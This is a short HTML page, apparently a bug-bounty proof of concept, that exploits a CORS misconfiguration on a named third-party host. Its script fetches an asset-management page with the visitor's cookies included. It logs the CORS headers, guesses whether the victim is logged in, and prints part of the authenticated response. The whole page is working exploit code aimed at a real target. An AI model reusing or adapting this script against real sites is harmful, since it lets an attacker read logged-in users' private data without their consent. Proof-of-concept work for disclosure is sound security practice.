<!DOCTYPE html>
<html>
<head>
  <title>CORS Page Viewer</title>
</head>
<body>
  <h2>Load CORS content from intigriti.ilias-solutions.com</h2>
  <button onclick="loadPage()">Load Page</button>
  <iframe id="corsFrame" width="100%" height="600px"></iframe>

  <script>
    function loadPage() {
      fetch("https://intigriti.ilias-solutions.com/intigriti/assmgmt/", {
        credentials: "include"
      }).then(async r => {
        const txt = await r.text();
        console.log("Status:", r.status);
        console.log("ACAO:", r.headers.get("access-control-allow-origin"));
        console.log("ACAC:", r.headers.get("access-control-allow-credentials"));
        console.log("Looks logged in?:", /logout|username|ng-app="assmgmt"/i.test(txt) && !/login/i.test(txt));
        console.log(txt.slice(0, 500)); // peek
      });

    }
  </script>
</body>
</html>
